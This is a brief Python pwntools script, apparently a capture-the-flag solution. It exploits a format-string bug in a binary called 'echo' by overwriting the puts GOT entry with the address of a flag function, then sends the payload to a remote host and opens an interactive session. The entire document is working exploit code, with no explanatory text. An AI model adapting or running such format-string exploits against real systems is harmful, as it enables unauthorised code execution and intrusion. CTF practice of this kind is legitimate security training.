from pwn import *

puts_got = 0x601018
get_flag = 0x4007B6
#r = process("./echo")
r = remote("125.235.240.168", 27015)
raw_input("?")
payload = "%1974x%11$hn"
payload += "%10000000x"
payload = payload.ljust(0x18,'\x00')
payload += p64(0x601018)
r.sendline(payload)
print r.recv()
r.interactive()